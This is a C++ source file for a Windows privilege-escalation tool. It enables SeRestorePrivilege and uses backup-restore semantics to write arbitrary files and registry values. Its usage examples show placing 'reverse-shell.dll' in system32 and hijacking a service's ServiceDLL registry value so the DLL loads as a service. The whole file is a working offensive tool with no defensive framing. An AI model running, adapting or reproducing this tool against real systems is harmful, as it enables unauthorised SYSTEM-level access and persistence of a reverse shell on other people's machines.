#include <windows.h>
#include <stdio.h>
#include <string>
#include <winreg.h>
#include <fileapi.h>

bool SeRestore_registry_write(char hkey_p[], char subkey[], char valueName[], std::string data) {
	HKEY hkey;
	HKEY hk;
	LSTATUS stat;

	if (strcmp(hkey_p, "hklm") == 0) {
		hkey = HKEY_LOCAL_MACHINE;
	}
	else if (strcmp(hkey_p, "hkcu") == 0) {
		hkey = HKEY_CURRENT_USER;
	}
	else {
		printf("[-] hkey not supported\n");
		return false;
	}

	stat = RegCreateKeyExA(hkey,
		subkey,
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&hk,
		NULL);

	if (stat != ERROR_SUCCESS) {
		printf("[-] Error while opening the registry key\n");
		return false;
	}

	stat = RegSetValueExA(hk, valueName, 0, REG_EXPAND_SZ, (const BYTE*)data.c_str(), data.length() + 1);

	if (stat != ERROR_SUCCESS) {
		printf("[-] Error while setting value into registry key\n");
		return false;
	}

	return true;
}

bool SeRestore_write_file(LPCWSTR inputFile, LPCWSTR outputFile) {
	HANDLE src, dst;
	LARGE_INTEGER iSize;
	DWORD bytesRead, bytesWritten;
	char* buff;

	src = CreateFile(inputFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (src == INVALID_HANDLE_VALUE) {
		printf("[-] Error while opening inputFile\n");
		return false;
	}

	GetFileSizeEx(src, &iSize);

	dst = CreateFile(outputFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);

	if (dst == INVALID_HANDLE_VALUE) {
		printf("[-] Error while opening outputFile\n");
		CloseHandle(src);
		return false;
	}

	buff = new char[iSize.QuadPart];

	if (buff == NULL) {
		printf("[-] Alloc error\n");
		CloseHandle(src);
		CloseHandle(dst);
		return false;
	}
	
	if (!ReadFile(src, buff, iSize.QuadPart, &bytesRead, NULL)) {
		printf("[-] Error while reading inputFile\n");
		delete[] buff;
		CloseHandle(src);
		CloseHandle(dst);
		return false;
	}

	WriteFile(dst, buff, bytesRead, &bytesWritten, NULL);

	delete[] buff;
	CloseHandle(src);
	CloseHandle(dst);

	return true;
}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		return FALSE;
	}

	return TRUE;
}

void print_usage(char *argv[]) {
	printf("Usage:\n");
	printf("\t.\\%s filewrite <src-path> <dst-path>\n", argv[0]);
	printf("\t.\\%s regwrite <hkey> <subkey> <value-name> <data>\n\n", argv[0]);

	printf("Examples:\n");
	printf("\t.\\%s filewrite \"C:\\Temp\\reverse-shell.dll\" \"C:\\Windows\\system32\\reverse-shell.dll\"\n", argv[0]);
	printf("\t.\\%s regwrite hklm \"SYSTEM\\CurrentControlSet\\Services\\service\\Parameters\" ServiceDLL  \"C:\\Windows\\system32\\reverse-shell.dll\"\n\n", argv[0]);
}

std::string convertToString(char* a, int size) {
	int i;
	std::string s = "";

	for (int i = 0; i < size; i++) {
		s = s + a[i];
	}

	return s;
}

int main(int argc, char *argv[]) {
	bool success;
	std::string s;
	wchar_t *inputFile, *outputFile;
	int len;
	size_t size, outSize;
	HANDLE hToken;

	if (argc < 4) {
		print_usage(argv);
		return 1;
	}

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);

	if (!SetPrivilege(hToken, SE_RESTORE_NAME, TRUE)) {
		printf("[-] Failed to set privilege\n");
		return 1;
	}
	else {
		printf("[+] Privilege enabled\n");
	}
	
	if (strcmp(argv[1], "regwrite") == 0) {
		if (argc != 6) {
			print_usage(argv);
			return 1;
		}

		s = convertToString(argv[5], strlen(argv[5]));
		success = SeRestore_registry_write(argv[2], argv[3], argv[4], s);

		if(!success) {
			printf("[-] Failed to write in registry\n");
			return 1;
		}

		printf("[+] Success writing into registry\n");
	}
	else if (strcmp(argv[1], "filewrite") == 0) {
		if (argc != 4) {
			print_usage(argv);
			return 1;
		}

		size = strlen(argv[2]) + 1;
		inputFile = new wchar_t[size];
		
		mbstowcs_s(&outSize, inputFile, size, argv[2], size-1);

		size = strlen(argv[3]) + 1;
		outputFile = new wchar_t[size];

		mbstowcs_s(&outSize, outputFile, size, argv[3], size - 1);

		success = SeRestore_write_file(inputFile, outputFile);

		if (!success) {
			printf("[-] Failed to write file\n");
			return 1;
		}

		printf("[+] Success writing file\n");
	}

	return 0;
}